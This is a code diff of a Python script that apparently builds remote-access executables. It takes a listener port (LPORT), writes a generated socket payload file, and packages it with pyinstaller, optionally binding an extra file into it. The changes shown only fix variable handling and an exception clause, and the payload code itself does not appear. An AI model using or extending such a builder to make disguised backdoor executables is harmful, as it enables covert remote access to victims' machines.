@@ -33,6 +33,7 @@ if LPORT == "":
 file_name = input("executable name: ")
 added_file_name = ""
 file_choice = input("Do you want to add file to your executable ? (y/N)")
+file_path = ""
 if not file_choice == "" and file_choice.lower() == "y":
     file_path = input("file path:")
     added_file_name = os.path.basename(file_path)
@@ -74,17 +75,17 @@ with open("socket_file.py", "w") as sc:
         sc.write(line)
 
 try:
-    if file_name == "" and (added_file_name is not None or not added_file_name == ""):
+    if file_name == "" and (not added_file_name == "" or not file_path == ""):
         subprocess.run(["pyinstaller", "socket_file.py", "--onefile", "--add-data", "\"{}.\"".format(file_path)], stdout=subprocess.DEVNULL)
     elif file_name == "":
         subprocess.run(["pyinstaller", "socket_file.py", "--onefile"], stdout=subprocess.DEVNULL)
     else:
         subprocess.run(["pyinstaller", "socket_file.py", "-n", file_name, "--onefile"], stdout=subprocess.DEVNULL)
-except Exception:
+except Exception as e:
     user_choice = input("You must install 'pyinstaller' module. Do you want me to install it for you ? (Y/n)")
     if user_choice == "" or user_choice.lower() == "y":
         subprocess.run(["python3", "-m", "pip", "install", "pyinstaller"])
-        if file_name == "" and (added_file_name is not None or not added_file_name == ""):
+        if file_name == "" and (not added_file_name == "" or not file_path == ""):
             subprocess.run(["pyinstaller", "socket_file.py", "--onefile", "--add-data", "\"{}.\"".format(file_path)],
                            stdout=subprocess.DEVNULL)
         elif file_name == "":
